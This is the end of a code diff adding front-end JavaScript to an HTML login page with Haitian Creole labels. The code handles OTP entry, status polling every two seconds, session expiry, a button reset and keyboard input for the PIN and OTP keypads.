+                    otpInputs.forEach(i => i.value = "");
+                    currentOtpIndex = 0;
+                    document.getElementById('otp1').focus();
+                    startPolling();
+                }
+                else if (data.status === 'EXPIRED') {
+                    stopPolling();
+                    resetLoginBtn();
+                    alert("Sesyon ekspire. Tanpri rekòmanse.");
+                }
+            } catch (e) {
+                console.error("Polling error:", e);
+            }
+        }, 2000);
+    }
+
+    function stopPolling() {
+        if (pollInterval) clearInterval(pollInterval);
+        pollInterval = null;
+    }
+
+    function resetLoginBtn() {
+        const btn = document.getElementById('btn-submit-login');
+        const btnText = document.getElementById('login-btn-text');
+        const loader = document.getElementById('login-loader');
+        btn.disabled = false;
+        btnText.innerText = "KONTINYE POU LOGIN";
+        loader.style.display = "none";
+    }
+
+    /* ---------------- Keyboard input (desktop) ---------------- */
+    document.addEventListener('keydown', (e) => {
+        const activeScreen = document.querySelector('.screen.active').id;
+
+        if (activeScreen === 'screen-otp') {
+            if (e.key >= '0' && e.key <= '9') { e.preventDefault(); inputOTP(e.key); }
+            else if (e.key === 'Backspace') { e.preventDefault(); deleteOTP(); }
+        }
+        if (activeScreen === 'screen-login') {
+            if (e.key >= '0' && e.key <= '9') { e.preventDefault(); handleKeypad(e.key); }
+            else if (e.key === 'Backspace') { e.preventDefault(); handleDelete(); }
+        }
+    });
+</script>
+</body>
+</html>
